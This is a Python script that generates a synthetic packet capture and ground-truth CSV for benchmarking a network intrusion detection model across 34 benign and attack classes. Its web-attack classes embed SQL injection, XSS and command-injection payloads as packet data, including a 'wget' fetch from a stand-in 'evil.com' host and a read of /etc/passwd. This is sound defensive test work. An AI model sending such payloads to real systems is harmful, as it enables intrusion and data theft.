#!/usr/bin/env python3
"""
Generate large-scale validation PCAP for model accuracy testing.

Outputs:
  validation_benchmark.pcap     (~120-150MB)
  validation_ground_truth.csv   (ground truth + labeled/unlabeled flags)

Usage:
  python generate_validation_pcap.py [--flows 60000] [--output validation_benchmark.pcap]
"""
import argparse, csv, os, random, struct, time as _time
import dpkt

random.seed(2026)

# 34 classes with distribution weights (total ~= 1.0)
CLASSES = {
    "Benign": 0.35,
    "DDoS-TCP_Flood": 0.06, "DDoS-UDP_Flood": 0.05, "DDoS-ICMP_Flood": 0.03,
    "DDoS-HTTP_Flood": 0.04, "DDoS-SYN_Flood": 0.04, "DDoS-SlowLoris": 0.02,
    "DDoS-RSTFIN_Flood": 0.02, "DDoS-Pshack_Flood": 0.02,
    "DDoS-ACK_Fragmentation": 0.01, "DDoS-UDP_Fragmentation": 0.01,
    "DDoS-ICMP_Fragmentation": 0.01,
    "Recon-PortScan": 0.04, "Recon-OSScan": 0.02,
    "Recon-HostDiscovery": 0.02, "Recon-PingSweep": 0.02,
    "BruteForce-SSH": 0.03, "BruteForce-FTP": 0.02,
    "BruteForce-HTTP": 0.02, "BruteForce-Dictionary": 0.01,
    "Spoofing-ARP": 0.01, "Spoofing-DNS": 0.02, "Spoofing-IP": 0.01,
    "WebAttack-SQLi": 0.02, "WebAttack-XSS": 0.02,
    "WebAttack-CommandInjection": 0.01, "WebAttack-BrowserHijacking": 0.01,
    "Malware-Backdoor": 0.02, "Malware-Ransomware": 0.01,
    "Mirai-greeth_flood": 0.01, "Mirai-greip_flood": 0.01,
    "Mirai-udpplain": 0.01, "Mirai-ack": 0.01,
    "DNS_Spoofing": 0.01,
}

ATTACKER_NETS = ["192.168.99.", "198.51.100.", "203.0.113."]
TARGET_NETS = ["10.0.1.", "10.0.2.", "10.50.1.", "172.16.1."]
BENIGN_NETS = ["192.168.1.", "192.168.2.", "10.0.1."]

def rand_ip(nets):
    return random.choice(nets) + str(random.randint(1, 254))

def ip_to_bytes(ip_str):
    return bytes(int(o) for o in ip_str.split('.'))

def make_tcp(src, dst, sport, dport, flags, payload=b''):
    tcp = dpkt.tcp.TCP(sport=sport, dport=dport, flags=flags,
                       seq=random.randint(0, 2**31), data=payload)
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_TCP, data=tcp, len=20 + len(bytes(tcp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)

def make_udp(src, dst, sport, dport, payload=b''):
    udp = dpkt.udp.UDP(sport=sport, dport=dport, data=payload)
    udp.ulen = 8 + len(payload)
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_UDP, data=udp, len=20 + len(bytes(udp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)

def make_icmp(src, dst, icmp_type=8, payload=b''):
    icmp = dpkt.icmp.ICMP(type=icmp_type, data=dpkt.icmp.ICMP.Echo(
        id=random.randint(0, 65535), seq=random.randint(0, 65535), data=payload))
    ip = dpkt.ip.IP(src=ip_to_bytes(src), dst=ip_to_bytes(dst),
                    p=dpkt.ip.IP_PROTO_ICMP, data=icmp, len=20 + len(bytes(icmp)))
    return bytes(ip)

def rp(lo=100, hi=1400):
    """Random payload."""
    return random.randbytes(random.randint(lo, hi))

def rport():
    return random.randint(1024, 65535)

# -- Shorthand flags --------------------------------------------------------
SYN = dpkt.tcp.TH_SYN
ACK = dpkt.tcp.TH_ACK
PSH_ACK = dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK
RST = dpkt.tcp.TH_RST

def gen_flow(label, ts_base):
    """Return (src_ip, dst_ip, [(timestamp, raw_packet), ...]) for one flow."""
    pkts = []
    n = random.randint(5, 20)
    ts = ts_base
    src = rand_ip(ATTACKER_NETS)
    dst = rand_ip(TARGET_NETS)

    if label == "Benign":
        src = rand_ip(BENIGN_NETS)
        sp, dp = rport(), random.choice([80, 443, 53, 22, 8080])
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, rp(200, 1200))))

    elif "DDoS-TCP" in label or "DDoS-SYN" in label \
            or "DDoS-RSTFIN" in label or "DDoS-Pshack" in label:
        dp = random.choice([80, 443, 8080])
        if "SYN" in label:       fl = SYN
        elif "RST" in label:     fl = RST
        elif "Pshack" in label:  fl = PSH_ACK
        else:                    fl = SYN | ACK
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            pkts.append((ts, make_tcp(src, dst, rport(), dp, fl, rp(60, 200))))

    elif "DDoS-UDP" in label or "Mirai-udpplain" in label:
        dp = random.choice([53, 123, 161, 1900])
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            pkts.append((ts, make_udp(src, dst, rport(), dp, rp(100, 1400))))

    elif "DDoS-ICMP" in label or "Recon-PingSweep" in label:
        for _ in range(n):
            ts += random.uniform(0.001, 0.05)
            pkts.append((ts, make_icmp(src, dst, 8, rp(64, 1000))))

    elif "DDoS-HTTP" in label or "DDoS-SlowLoris" in label:
        req = f"GET /{random.randbytes(50).hex()} HTTP/1.1\r\nHost: target\r\n\r\n".encode()
        for _ in range(n):
            ts += random.uniform(0.01, 2.0) if "Slow" in label else random.uniform(0.001, 0.02)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req + rp(0, 200))))

    elif "Fragmentation" in label:
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            if "ACK" in label:
                pkts.append((ts, make_tcp(src, dst, rport(), random.choice([80, 443]), ACK, rp(8, 64))))
            elif "UDP" in label:
                pkts.append((ts, make_udp(src, dst, rport(), random.randint(1, 65535), rp(1400, 1480))))
            else:
                pkts.append((ts, make_icmp(src, dst, 8, rp(1400, 1480))))

    elif "Recon-PortScan" in label:
        for i in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 1 + i * random.randint(1, 100), SYN, b'')))

    elif "Recon-OSScan" in label:
        for _ in range(n):
            ts += random.uniform(0.05, 0.2)
            pkts.append((ts, make_tcp(src, dst, rport(),
                         random.choice([22, 80, 443, 135, 139, 445]),
                         SYN | dpkt.tcp.TH_FIN | dpkt.tcp.TH_URG, b'')))

    elif "Recon-HostDiscovery" in label:
        for i in range(n):
            ts += random.uniform(0.05, 0.2)
            dst = random.choice(TARGET_NETS) + str(1 + i)
            pkts.append((ts, make_icmp(src, dst, 8, b'\x00' * 56)))

    elif "BruteForce" in label:
        port_map = {"SSH": 22, "FTP": 21, "HTTP": 80, "Dictionary": 22}
        dp = next((v for k, v in port_map.items() if k in label), 22)
        for _ in range(n):
            ts += random.uniform(0.1, 1.0)
            pay = f"USER admin\r\nPASS {random.randbytes(8).hex()}\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), dp, PSH_ACK, pay)))

    elif "Spoofing-ARP" in label:
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            pkts.append((ts, make_udp(src, dst, 68, 67, b'\x00\x01' + rp(28, 46))))

    elif "Spoofing-DNS" in label or "DNS_Spoofing" in label:
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            dns = struct.pack('>HHHHHH', random.randint(0, 65535), 0x8180, 1, 1, 0, 0) + rp(20, 100)
            pkts.append((ts, make_udp(src, dst, 53, rport(), dns)))

    elif "Spoofing-IP" in label:
        src, dst = rand_ip(TARGET_NETS), rand_ip(TARGET_NETS)
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), random.choice([80, 443]), ACK, rp(100, 500))))

    elif "WebAttack-SQLi" in label:
        sqls = [b"' OR 1=1--", b"'; DROP TABLE users;--",
                b"' UNION SELECT * FROM passwords--", b"1' AND SLEEP(5)--"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            s = random.choice(sqls)
            req = f"GET /search?q={s.decode(errors='replace')} HTTP/1.1\r\nHost: t\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif "WebAttack-XSS" in label:
        xsses = [b"<script>alert('XSS')</script>", b"<img src=x onerror=alert(1)>",
                 b"<svg onload=alert('XSS')>"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            x = random.choice(xsses)
            req = f"POST /comment HTTP/1.1\r\nHost: t\r\nContent-Length: {len(x)}\r\n\r\n".encode() + x
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif "WebAttack-CommandInjection" in label:
        cmds = [b"; cat /etc/passwd", b"| ls -la /", b"&& wget http://evil.com/sh", b"`id`"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            c = random.choice(cmds)
            req = f"GET /api/exec?cmd={c.decode(errors='replace')} HTTP/1.1\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))

    elif "WebAttack-BrowserHijacking" in label:
        for _ in range(n):
            ts += random.uniform(1.0, 5.0)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, rp(500, 1400))))

    elif "Malware-Backdoor" in label:
        src, dst = rand_ip(TARGET_NETS), rand_ip(ATTACKER_NETS)
        for _ in range(n):
            ts += random.uniform(10.0, 60.0)
            pkts.append((ts, make_tcp(src, dst, rport(),
                         random.choice([4444, 5555, 8888, 1337]), PSH_ACK, rp(50, 300))))

    elif "Malware-Ransomware" in label:
        src, dst = rand_ip(TARGET_NETS), rand_ip(TARGET_NETS)
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 445, PSH_ACK, rp(800, 1400))))

    elif "Mirai" in label:
        src, dst = rand_ip(["172.16.1.", "172.16.2."]), rand_ip(ATTACKER_NETS)
        dp = random.choice([23, 2323, 7547, 37215])
        for _ in range(n):
            ts += random.uniform(0.001, 0.05)
            if "greeth" in label or "ack" in label:
                pkts.append((ts, make_tcp(src, dst, rport(), dp, ACK, rp(64, 200))))
            else:
                pkts.append((ts, make_udp(src, dst, rport(), dp, rp(100, 800))))

    else:  # fallback
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, ACK, rp(200, 1000))))

    return src, dst, pkts


def main():
    ap = argparse.ArgumentParser(description="Generate validation PCAP for model testing")
    ap.add_argument("--flows", type=int, default=60000, help="Number of flows (default: 60000)")
    ap.add_argument("--output", default="validation_benchmark.pcap", help="Output PCAP filename")
    ap.add_argument("--labeled-ratio", type=float, default=0.6, help="Labeled fraction (default: 0.6)")
    args = ap.parse_args()

    output_dir = os.path.dirname(os.path.abspath(__file__))
    pcap_path = os.path.join(output_dir, args.output)
    csv_path = os.path.join(output_dir, args.output.replace('.pcap', '_ground_truth.csv'))

    # Build flow schedule from distribution weights
    flow_labels = []
    for label, weight in CLASSES.items():
        flow_labels.extend([label] * max(1, int(args.flows * weight)))
    # Shuffle before trimming so no class is entirely removed
    random.shuffle(flow_labels)
    while len(flow_labels) < args.flows:
        flow_labels.append(random.choice(list(CLASSES.keys())))
    flow_labels = flow_labels[:args.flows]
    random.shuffle(flow_labels)

    print(f"Generating {args.flows:,} flows -> {pcap_path}")
    print(f"Labeled ratio: {args.labeled_ratio:.0%}  |  Classes: {len(set(flow_labels))}\n")

    writer = dpkt.pcap.Writer(open(pcap_path, 'wb'), linktype=dpkt.pcap.DLT_RAW)
    csv_f = open(csv_path, 'w', newline='')
    cw = csv.writer(csv_f)
    cw.writerow(['flow_id', 'src_ip', 'dst_ip', 'label', 'true_label', 'is_labeled', 'n_packets'])

    ts = _time.time() - args.flows * 0.5
    class_counts, total_bytes, labeled_count = {}, 0, 0

    for i, label in enumerate(flow_labels):
        src, dst, packets = gen_flow(label, ts)
        is_labeled = random.random() < args.labeled_ratio
        if is_labeled:
            labeled_count += 1
        fid = f"F{i + 1:06d}"
        for pkt_ts, pkt_data in packets:
            writer.writepkt(pkt_data, pkt_ts)
            total_bytes += len(pkt_data)
        cw.writerow([fid, src, dst, label if is_labeled else '', label, is_labeled, len(packets)])
        ts = packets[-1][0] if packets else ts + 0.1
        class_counts[label] = class_counts.get(label, 0) + 1
        if (i + 1) % 5000 == 0:
            print(f"  [{i+1:,}/{args.flows:,}] {total_bytes / (1024*1024):.1f} MB generated...")

    writer.close()
    csv_f.close()

    pcap_mb = os.path.getsize(pcap_path) / (1024 * 1024)
    csv_mb = os.path.getsize(csv_path) / (1024 * 1024)
    unlabeled = args.flows - labeled_count
    print(f"\n{'=' * 60}")
    print(f"Generated: {pcap_path} ({pcap_mb:.1f} MB)")
    print(f"Ground truth: {csv_path} ({csv_mb:.2f} MB)")
    print(f"Total flows: {args.flows:,}")
    print(f"Labeled: {labeled_count:,} ({labeled_count/args.flows:.1%})")
    print(f"Unlabeled: {unlabeled:,} ({unlabeled/args.flows:.1%})")
    print(f"\nClass distribution:")
    for lbl, cnt in sorted(class_counts.items(), key=lambda x: -x[1]):
        print(f"  {lbl:35s} {cnt:6,} ({cnt/args.flows*100:5.1f}%)")
    print(f"{'=' * 60}")


if __name__ == '__main__':
    main()
